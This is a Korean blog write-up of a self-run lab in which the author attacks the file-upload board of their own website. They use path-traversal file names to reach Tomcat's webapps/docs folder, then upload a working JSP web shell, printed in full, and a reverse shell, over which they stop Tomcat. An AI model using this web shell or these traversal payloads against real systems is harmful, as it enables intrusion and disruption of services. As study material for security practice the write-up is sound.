---
title: "File Upload 공격 실습 (2)"
excerpt: "File Upload 취약점을 찾고 공격을 시도해보자."
tags:
    - file upload
    - 웹쉘
    - 리버스 쉘
last_modified_at: 2023-06-06T09:13:00-05:00
---
## 취약점 사이트
- 내가 만든 웹 사이트를 이용하였다.<br>![Pasted image 20230606142017](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c46d4050-cc28-43ea-8e0f-0fca6023ca7f)


## 서버 탐색 및 취약점 탐색

### 서버 버전 확인
- 우분투에서 동작하고 nginx 웹 서버라는 것을 알 수 있다.<br>![Pasted image 20230606115619](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9d0d03ec-9386-43c7-acd8-615572156ef9)

- 일부러 URL 주소를 이상하게 입력하여 404 페이지에 접속하면 WAS로 apache tomcat을 사용하는 것을 확인할 수 있다. 서버에서 사용중인 tomcat 버전( 10.1.9 )도 확인이 가능하다.<br>![Pasted image 20230606161309](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/72d5bac4-509e-4304-b778-efd32e68f365)
- 즉 웹 서버는 nginx + tomcat 로 구성되었다는 것을 알 수 있다.


### File Upload ( 확장자 )
- 어느 확장자이든 모두 업로드가 가능하다.<br>![Pasted image 20230606192747](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0bb2ffbe-e2cc-475b-a27f-996f02ccc93c)<br>![Pasted image 20230606192657](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/adea29b3-d8a4-4bad-a496-d1cf05edec45)<br>![Pasted image 20230606181012](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13ec695b-bd36-418f-9b62-4c5bf5839520)

- 즉 이 웹서버는 확장자를 필터링 하지않는다.


### File Upload 취약점 (traversal)
- 게시글을 올릴 때 파일 업로드도 같이 할 수 있다. 여기서 공격자가 파일의 이름을 바꾸어 파일 위치를 공격자가 마음데로 설정할 수 있는 traversal 우회방법을 발견하였다.
- 정상적으로 파일이름이 설정되었을 경우. 게시글에 첨부파일이 잘 올라간 것을 확인할 수 있다. <br>![Pasted image 20230606153031](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2efa9f9e-2b44-46dd-921b-c8f06c40b0af)<br>![Pasted image 20230606153110](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2dad52ea-1455-4f15-a393-64f04439ff8d)<br>![Pasted image 20230606160012](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c603ea41-bdd2-4b67-b70f-65b14f5723a3)
- 현재 디렉토리를 뜻하는 `./` 를 파일 이름에 붙여 업로드 하는경우. 앞의 상황과 마찬가지로 첨부파일이 잘 올라갔고 다운로드도 잘되는 것을 확인할 수 있다.<br>![Pasted image 20230606155610](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e840920f-7033-4c5a-9404-829c4d72007b)<br>![Pasted image 20230606155621](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/41212880-4694-4594-8878-20d90d033e19)<br>![Pasted image 20230606160009](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8f0ddb37-aa7d-4699-8069-6101f328a0fc)
- 이렇게 업로드 경로를 공격자 마음대로 바꿀 수 있다.


### 파일 업로드 위치 파악하기 ( 예측하기 )
- 다운로드 링크를 통해서는 어디에 저장되었는지 정확히 파악하기 힘들다.<br>`http://221.27.0.6/main_page/notice_board/notice_file_download?downlink=test.png&pageid=129`
- 웹 서버와 파일 업로드 서버 위치가 물리적으로 분리되어 있다면 공격자는 웹쉘 코드에 접근할 수 없다. 즉 공격을 성공할 수가 없다. 따라서 여기서는 웹 서버와 파일 업로드 서버 위치가 동일한 것으로 가정하였다.

- tomcat 파일 구조 파악하기. 폴더만 표시하였다.

```
apache-tomcat-10.1.9/
├── bin
├── conf
├── lib
├── logs
├── temp
├── webapps
└── work
```

- webapps 폴더에 공격자가 만든 jsp 파일을 올려주어야 공격자가 jsp 파일에 접근이 가능하다.

#### 파일 업로드 폴더 구조 예측

```
1. 업로드 폴더+게시글 구분 > 파일 저장

2. 업로드 폴더 > 게시글 구분 > 파일 저장
```

#### 파일 업로드 폴더 위치 후보 1
-  webapps > ROOT > WEB-INF > 업로드 폴더
- WEB-INF 폴더에 있는 파일들은 링크를 통해 외부에서 접근이 불가능 하다.

```
webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더
```

##### 업로드 폴더 구조 (1) 일 때. 
- 다음과 같이 파일 이름을 주면 사용자는 링크를 통해 파일에 접근이 가능하다.

```
webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더+게시글 구분
../../../파일이름

http://221.27.0.6/minqtest.png
```
- 테스트 업로드 성공<br>![Pasted image 20230606181001](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/1f5210e8-e942-407a-aa3a-6eb37624a017)<br>![Pasted image 20230606181012](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/beb12c24-0acb-4617-ab5a-b7622a79b2ee)
- url 로 접근 테스트 404 페이지 실패<br>![Pasted image 20230606181136](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c60d0b70-4457-4720-8291-b2728f1342d9)


##### 업로드 폴더 구조 (2) 일 때. 
- 다음과 같이 파일 이름을 주면 사용자는 링크를 통해 파일에 접근이 가능하다.

```
webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더
            └── 게시글 구분
../../../../파일이름

http://221.27.0.6/minqtest.png
```

- 업로드 성공<br>![Pasted image 20230606181643](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2f7bb2fd-00b2-4852-bfa9-4d1ba08c041a)<br>![Pasted image 20230606181012](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/68931607-ae04-4188-a914-1da0334ffa95)


- url 접근 실패<br>![Pasted image 20230606181136](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b538afb7-0390-4abd-a069-46fb6bcd81a9)


#### 파일 업로드 폴더 위치 후보 2
- apache-tomcat-10.1.9 와 같은 위치.
- 사용자는 링크를 통해 파일에 바로 접근이 불가능 하다.
- 이 방법을 성공할려면 먼저 톰캣 폴더명을 알아야한다. 웹 서버에서 톰캣 폴더명을 바꿨으면 불가능한 방법이다.

```
.
├── apache-tomcat-10.1.9
└── 업로드 폴더
```

##### 업로드 폴더 구조 (1) 일 때. 
- 파일 이름

```
.
├── apache-tomcat-10.1.9
└── 업로드 폴더+게시글 구분
../apache-tomcat-10.1.9/파일이름

http://221.27.0.6/minqtest.png
```
- 파일 업로드 실패<br>![Pasted image 20230606182556](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2d3fca2e-0760-4746-bfdb-0684f021a4cc)<br>![Pasted image 20230606183701](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121)

##### 업로드 폴더 구조 (2) 일 때. 
- 파일 이름

```
.
├── apache-tomcat-10.1.9
└── 업로드 폴더
    └── 게시글 구분
../../apache-tomcat-10.1.9/파일이름

http://221.27.0.6/minqtest.png
```

- 파일 업로드 실패<br>![Pasted image 20230606183741](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5ea0c765-d121-4113-9b60-463095febca6)<br>![Pasted image 20230606183701](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121)


#### 파일 업로드 폴더 위치 후보 3
- apache-tomcat-10.1.9 > 업로드 폴더
- apache-tomcat-10.1.9 폴더에 있으면 사용자는 링크를 통해 파일에 바로 접근이 불가능하다.

```
apache-tomcat-10.1.9/
├── bin
├── conf
├── lib
├── logs
├── temp
├── webapps
├── work
└── 업로드 폴더
```

##### 업로드 폴더 구조 (1) 일 때. 
- 파일 이름

```
apache-tomcat-10.1.9/
└── 업로드 폴더 + 게시글 구분

../webapps/파일이름
```

- 파일 업로드 실패<br>![Pasted image 20230606184017](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8e3f118f-d751-4862-8fe5-244451464542)<br>![Pasted image 20230606183701](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121)


##### 업로드 폴더 구조 (2) 일 때. 
- 파일 이름

```
apache-tomcat-10.1.9/
└── 업로드 폴더    
    └── 게시글 구분

../../webapps/파일이름
```

- 파일 업로드 성공<br>![Pasted image 20230606184515](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/efda89a2-8c4f-4e35-b164-c4512ea11276)<br>![Pasted image 20230606184506](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09fc501b-58fe-42a0-9570-a3a908960337)

- url 접근 실패<br>![Pasted image 20230606181136](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/75cfe84d-14e7-44bb-8d56-31a5150c3b84)

- url 통해 접근은 실패하였지만 업로드 폴더 위치를 파악할 수 있었다.

```
apache-tomcat-10.1.9/
├── webapps
└── 업로드 폴더    
    └── 게시글 구분 
		└── 업로드 파일
```

## 파일 업로드 위치
- 예측을 통해 업로드 위치를 알 수 있었다.

```
apache-tomcat-10.1.9/
├── webapps
└── 업로드 폴더    
    └── 게시글 구분 
		└── 업로드 파일
```

- webapps 의 ROOT 폴더에 넣어도 링크를 통해 바로 업로드한 파일로 접근이 안된다.<br>![Pasted image 20230606191318](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/af22a868-5681-40f3-8ece-461180d7a863)<br>![Pasted image 20230606191326](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/640b1f30-d8e5-4387-94b8-a8e9be30991e)<br>![Pasted image 20230606191344](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/732aa0f9-ddad-4de7-8a74-1b953c7e5f70)

- tomcat 을 다운받았을 때 webapps 에 디펄트로 존재하는 폴더를 이용해 보았다.<br>![Pasted image 20230606191728](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fd1fe366-8e57-4acb-a59e-9ed0f4d12755)<br>![Pasted image 20230606192006](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/87f5322d-9929-43aa-9087-73f11a27ec8e)
- ROOT 폴더가 아닌 docs 폴더에 업로드 파일 넣기 성공.<br>![Pasted image 20230606192124](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/60be46c1-b391-4db9-affa-5341e173449e)<br>![Pasted image 20230606191326](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/62374466-f5ad-4cf2-b1aa-dd1faecbeba6)
- 링크를 통해 업로드한 파일에 접근을 성공하였다.<br>![Pasted image 20230606192419](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/cf906ee9-78f1-40ba-807a-e58642ed14cd)

```
http://221.27.0.6/docs/minqtest.png
```

### 최종 파일 이름

- 업로드 파일 이름<br> `../../webapps/docs/파일이름`

## 공격 시작

### 웹 쉘 업로드 하기 ( 바인드 쉘 )

#### JSP 웹 쉘
- 웹 쉘을 올려 공격자가 실행시킬 수 있는지 확인한다.

```jsp
<%@ page import="java.io.*" %>
<%
try {
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	InputStream in = p.getInputStream();
	int c;
	while((c=in.read())!=-1){
		out.print((char)c);
	}
	in.close();
	try {
		p.waitFor();
	}catch(Exception e){
		out.println(e.getMessage());
	}
}catch(Exception e){
	out.println(e.getMessage());
}
%>
```

1. jsp 웹 쉘을 업로드한다.<br>![Pasted image 20230606195407](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4c133a65-393e-43be-86b8-08553e1c2c50)<br>![Pasted image 20230606195423](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a3cfbd33-bff3-43c2-b8aa-68d8fc8c5a2c)

2. url 을 통해 webshell.jsp 에 접속해본다.<br>`http://221.27.0.6/docs/webshell.jsp?cmd=pwd`<br>![Pasted image 20230606201228](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a318901d-326a-44ea-98f2-c3b5bbf83850)<br>`cmd=ls+-al`<br>![Pasted image 20230606201827](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4934410f-e7fc-4d50-bc79-07c81c9fec5c)

### 리버스 쉘 코드 업로드하기.
<script src="https://gist.github.com/MinGyu2/356c116c38107dc26dbd5ff31dc3f1cd.js"></script><br>![Pasted image 20230606234740](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c855c5d1-d3d0-4bbb-8095-f33bd45bca56)


1. 공격자 서버는 웹 서버가 접속할 수 있도록 포트를 열어준다.<br>![Pasted image 20230606231634](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d68a6ce0-b18c-4e86-a091-5400f174eeea)
2. 리버스 쉘 코드를 업로드하여 공격자 서버와 연결한다.<br>![Pasted image 20230606231512](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4bcb265e-50f0-4d04-bfff-5f67aae98866)
3. 명령어를 입력하여 잘 연결되었는지 확인한다.<br>![Pasted image 20230606232200](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0af64267-ed35-4fea-acda-a5f2089ce709)<br>![Pasted image 20230606232217](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9fa04adf-f351-481f-bc73-4023cd2b9f6f)<br>![Pasted image 20230606233706](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fc383ef4-0103-4030-a01f-0781d644b3cf)
4. 리버스 쉘은 진짜 리눅스 터미널에서 명령을 입력하듯 사용하면된다.
5. 명령을 통해 웹 서버를 종료 시켜 보자. 관리자 권한이 없기 때문에 nginx 서버를 종료를 못시킨다. 따라서 일단 톰캣 서버를 종료시켜 보았다.<br>![Pasted image 20230606233814](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c2cd3afd-1a6a-423d-91bd-2453b8070b3c)<br>![Pasted image 20230606233825](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/33379e9d-9cf5-4eea-a8fc-b7c3bcf5106d)<br>![Pasted image 20230606233858](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/87fc6d7f-f3bd-42d0-a6be-da5d24c95d00)

## 후기
- File Upload 기능을 직접 구현하고 직접 File Upload 공격법을 시도해 보았다. 처음에는 취약점이 없을 텐데라고 생각하여 실습을 위해 일부러 취약점을 만들어야 하나 라고 생각하였다. 하지만 File Upload 의 traversal 우회기법을 사용하여 파일 업로드 위치를 공격자가 링크를 통하여 접근할 수 있는 위치로 설정할 수 있었다. 취약점 없다고 먼저 단정짓지말고 먼저 열심히 찾아보고 있는 없는지를 판단해야 겠다는 생각이 들었다.
- 윈도우에서 리버스 쉘을 작성을 하였을 때 악성 코드로 백신이 인식하여 삭제하는 참사가 있었다. 좀 당황하였지만 윈도우에 코드를 바로 저장하지 않고 메모장에 작성만 해놓았다가 burp suite 로 파일 업로드 할 때 파일 내용을 리버스 쉘 코드로 바꿔 주었다.
- 리버스 쉘이라는 이름을 듣고 처음에는 서버가 공격자 서버로 명령을 내리는 건가 라고 생각하였다. 하지만 리버스 쉘 코드를 보고 소켓을 통해 공격자 서버와 연결한 것이라는 것을 알 수 있었다. 
- 웹 쉘 코드를 웹 서버에 업로드하여 명령을 실행할 때도 엄청 신기하였는데 리버스 쉘 코드를 서버로 업로드하여 실제 서버와 ssh 연결한 것 처럼 명령을 주고 받으니 엄청 신기하였다.

## 참고 사이트
- [JSP-Reverse-and-Web-Shell/shell.jsp at main · LaiKash/JSP-Reverse-and-Web-Shell (github.com)](https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp)
- [php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [nc 이용하기(바인드쉘, 리버스쉘, 커맨드 실행) (velog.io)](https://velog.io/@hunjison/nc-%EC%9D%B4%EC%9A%A9%ED%95%98%EA%B8%B0%EB%B0%94%EC%9D%B8%EB%93%9C%EC%89%98-%EB%A6%AC%EB%B2%84%EC%8A%A4%EC%89%98-%EC%BB%A4%EB%A7%A8%EB%93%9C-%EC%8B%A4%ED%96%89)






